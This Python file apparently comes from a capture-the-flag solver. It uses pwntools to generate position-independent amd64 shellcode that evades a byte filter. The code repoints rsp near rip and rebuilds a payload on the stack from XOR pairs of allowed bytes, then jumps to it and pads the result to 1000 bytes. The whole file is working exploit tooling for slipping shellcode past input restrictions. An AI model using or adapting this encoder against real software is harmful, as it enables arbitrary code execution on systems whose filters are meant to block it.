import sys
import hashlib

import pwn

import gen

W = ['ax', 'cx', 'dx', 'bx', 'sp', 'bp', 'si', 'di']
# reigsters without rsp
# rbx, rbp, rdi, rsi, rsp, r12, r13, r14, and r15 are callee saved
R = [
    'rax', 'rcx', 'rdx', 'rbx', 'rbp', 'rsi', 'rdi', 'r8', 'r9', 'r10', 'r11',
    'r12', 'r13', 'r14', 'r15'
]

good = set()
flag = '?'

asm_memo = {}


def asm(code):
    global asm_memo

    digest = hashlib.sha1(code).digest()
    if digest in asm_memo:
        return asm_memo[digest]
    asm_memo[digest] = pwn.asm(code, arch='amd64')
    return asm_memo[digest]


def init(_filt, _flag):
    global good, flag, xor2
    flag = _flag
    if type(_filt) != type(''):
        sys.stderr.write('type(_filt) must be %s but was %s.' % (type(''),
                                                                 type(_filt)))
    if len(_filt) != 128:
        sys.stderr.write('len(_filt) should be 128 but was %d.' % len(_filt))
        exit(1)

    good = set(range(256)) ^ set([ord(c) for c in _filt])
    if len(good) != 128:
        sys.stderr.write('%d != 128' % len(good))
        exit(1)

    xor2 = [False] * 256
    for i in good:
        for j in good:
            xor2[i ^ j] = (i, j)
    for i in range(256):
        if not xor2[i]:
            sys.stderr.write('Internal error: init xor2\n')
            exit(1)


def is_valid(code):
    return set([ord(c) for c in asm(code)]) <= good


def get_valid(cands):
    a = []
    for cand in cands:
        a.append((len(asm(cand)), cand))
    a = sorted(a)
    for (_, cand) in a:
        if is_valid(cand):
            return cand
    return ''


def set_rsp():
    """ rsp <- rip + (0x0500 - 0x0f00) """
    cands = []
    off = 0

    for i in range(5, 0x10):
        if i in good:
            off = i * 0x100
            cands.append('lea rsp, [rip + %d]\n' % off)
            break

    mov_from = set()
    for r in R:
        s = 'mov rsp, %s\n' % r
        if is_valid(s):
            mov_from.add(r)

    if off > 0:
        for r in mov_from:
            cands.append('lea {0}, [rip + {1}]\nmov rsp, {0}\n'.format(r, off))

    if off > 0:
        for r in R:
            cands.append('''call a
                a:
                    mov %s, [rsp]
                    add %s, %d
                    mov rsp, %s\n''' % (r, r, off, r))
    cand = get_valid(cands)
    if cand:
        return cand
    sys.stderr.write('Failed: set_rsp\n')
    return ''


def push_tmpl():
    ok = iter(good).next()
    ok64 = 0
    for _ in range(8):
        ok64 *= 0x100
        ok64 += ok

    movable = set()
    for r in R:
        if is_valid('movabs %s, 0x%x' % (r, ok64)):
            movable.add(r)
    pushable = set()
    for r in R:
        if is_valid('push %s' % r):
            pushable.add(r)

    # use one register
    for r in movable & pushable:
        s = '''
            movabs {0}, 0x%x
            push {0}
            movabs {0}, 0x%x
            xor [rsp], {0}
        '''.format(r)
        if is_valid(s % (ok64, ok64)):
            return s

    # use two registers
    for r in movable & pushable:
        for r2 in movable:
            if r == r2:
                continue
            s = '''
                movabs {0}, 0x%x
                movabs {1}, 0x%x
                xor {0}, {1}
                push {0}
            '''.format(r, r2)
            if is_valid(s % (ok64, ok64)):
                return s

    sys.stderr.write('Failed: push_tmpl\n')
    return ''


def push_shellcode():
    global flag

    tmpl = push_tmpl()
    if not tmpl:
        return ''

    shellcode = asm(gen.shellcode64(flag))

    step = 8
    while len(shellcode) % step != 0:
        shellcode += shellcode[0]

    code = ''
    for i in reversed(range(0, len(shellcode), step)):
        x1 = 0
        x2 = 0
        for j in reversed(range(step)):
            x1 *= 0x100
            x2 *= 0x100
            c = ord(shellcode[i + j])
            x1 += xor2[c][0]
            x2 += xor2[c][1]

        code += tmpl % (x1, x2)

    return code


def jmp_rsp():
    cands = ['jmp rsp\n', 'push rsp\nret\n']
    for r in R:
        cands.append('mov %s, rsp\njmp %s\n' % (r, r))

    cand = get_valid(cands)
    if cand:
        return cand

    sys.stderr.write('Failed: jmp_rsp\n')
    return ''


# PIC
def gen_shellcode(_filt, _flag):
    init(_filt, _flag)

    jobs = []
    jobs.append(set_rsp)
    jobs.append(push_shellcode)
    jobs.append(jmp_rsp)

    code = ''
    for job in jobs:
        s = job()
        if not s:
            return ''
        code += s

    a = asm(code)
    if len(a) > 1000:
        sys.stderr.write('|shellcode| = %d > 1000!\n' % len)
        return ''

    first = code.split('\n')[0]
    for _ in range(len(a), 1000, len(asm(first))):
        code += first + '\n'

    return code
